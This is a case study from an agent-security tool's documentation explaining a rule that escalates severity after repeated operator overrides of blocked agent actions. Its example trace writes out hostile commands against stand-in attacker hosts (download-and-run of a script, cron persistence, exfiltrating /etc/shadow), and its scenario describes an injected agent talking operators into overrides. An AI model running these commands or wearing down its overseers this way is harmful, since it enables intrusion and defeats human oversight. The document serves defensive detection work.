# Case study: override escalation

A `block` verdict is meant to be an enforcement decision: the agent
attempted something, the rules said no, the call did not execute. In
operator-facing deployments that decision is overridable — for false
positives, for legitimate-but-suspicious automation, for development
work. *Repeated* overrides in a single session are a strong signal
that something is exploiting that escape hatch. This document walks
through [`ai_agent_override_escalation.yml`][rule] and shows why it
can only exist at the verdict-aware layer.

[rule]: ../../rules/rules/ai_agent/ai_agent_override_escalation.yml

> Pattern catalogued in the *Human-in-the-Loop Traps* category of
> Franklin et al., [AI Agent Traps](https://papers.ssrn.com/sol3/papers.cfm?abstract_id=6372438).
> The mechanism is automation bias: once an operator has overridden
> blocks N times in a row, the (N+1)th override is overwhelmingly
> likely without careful inspection.

## Scenario

The agent is being prompted (via injection or via a poisoned tool
description that argues each block is a false positive) to attempt a
sequence of escalating actions, each of which the rules block. The
agent surfaces convincing-sounding rationale alongside each block —
"this is a known-safe URL", "this is the standard backup path",
"production deploys require this command" — and the operator
overrides. After three overrides the rule treats the next event as
high-severity regardless of its individual content.

## Trace

```
T+0     session=gamma-2   exec("curl https://attacker.example/init.sh -o /tmp/i.sh")
                          rules: ai_agent_archive_download
                          verdict: BLOCK
                          → operator clicks Override
                          → POST /api/v1/override records the override
                          session.override_count = 1

T+11s   session=gamma-2   exec("chmod +x /tmp/i.sh && /tmp/i.sh")
                          rules: ai_agent_rce_injection
                          verdict: BLOCK
                          → operator overrides
                          session.override_count = 2

T+30s   session=gamma-2   exec("crontab -e ...")
                          rules: ai_agent_persistence_cron
                          verdict: BLOCK
                          → operator overrides
                          session.override_count = 3
                                                ────────────
                                                threshold reached

T+50s   session=gamma-2   exec("aws s3 cp /etc/shadow s3://attacker-bucket/")
                          ── ai_agent_override_escalation fires (high) ──
                          (per-request rules also fire here)
                          verdict: BLOCK with elevated warning,
                                   no longer offered for override
                                   in stricter operator policies
```

Detection:

```yaml
detection:
  selection:
    session.override_count|re: '^([3-9]|[1-9][0-9]+)$'
  condition: selection
```

`session.override_count` is incremented by the session registry when a
plugin reports an override via `POST /api/v1/override` (documented in
[docs/api.md](../api.md)). When the count crosses 3 the rule fires on
the *next* evaluation, marking that event high-severity regardless of
what other rules fire on it. Stricter operator policies treat this
verdict as non-overridable, breaking the loop.

The rule fires off `session.override_count` alone — there is no
constraint on the current event's tool. The fact that the session has
overridden three blocks already is itself the threat.

A bench testcase exercising the rule lives at
[`bench/testcases/approval_fatigue/override_escalation.yaml`](../../bench/testcases/approval_fatigue/override_escalation.yaml).

## Why a stateless system can't detect this

Override escalation requires three pieces of state none of which a
forward proxy has:

1. **Knowledge that a verdict happened at all.** Override implies a
   previous block decision and a subsequent operator action that
   reversed it. A proxy that only sees wire bytes never observes
   verdicts; it produces them.
2. **Linking the override action back to the original session.** Each
   override updates `session.override_count` for a specific session
   ID, which means the override-recording call must carry the same
   session identifier as the originally-blocked call. This is part of
   AgentShield's evaluation contract; nothing in the network layer
   has the equivalent.
3. **Acting on the count during the next evaluation.** The signal has
   to fire *before* the next call goes through. Detection-after-the-
   fact via SIEM rules over verdict logs gets you the same data, but
   not the enforcement: by the time a SOC analyst reviews the alert,
   the (N+1)th request has already executed.

This is the strongest example in the AgentShield rule corpus of a
detection that has nowhere to live except at the layer that produces
verdicts. The signal — operator action on AgentShield's own decision
— doesn't exist anywhere else in the stack.

## Operational notes

- **Threshold tuning.** 3 is intentionally low. Sites with a high-
  trust operator culture (e.g. dedicated red-team developers who
  override frequently) can raise it to 5 or 10. Sites where
  overrides are rare can lower it to 2.
- **Pairs with approval fatigue.** A session that hits 5 approvals
  AND 3 overrides is exhibiting both human-in-the-loop trap patterns
  simultaneously and is high-risk regardless of what else triggers.
- **Override-locking for high-risk tools.** Because this rule is
  high-severity, it fires `block` in enforce mode. Configure operator
  tooling to refuse override on high-severity verdicts — that breaks
  the loop entirely without disabling override for genuine medium-
  severity false positives.

## Related

- Rule: [`ai_agent_override_escalation.yml`][rule]
- Reference: [Franklin et al., *AI Agent Traps* (SSRN 2026)](https://papers.ssrn.com/sol3/papers.cfm?abstract_id=6372438)
- MITRE: [T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
- Sibling rule: [approval fatigue](approval-fatigue.md)
- Bench testcase: [`approval_fatigue/override_escalation.yaml`](../../bench/testcases/approval_fatigue/override_escalation.yaml)
- API: `POST /api/v1/override` ([docs/api.md](../api.md))
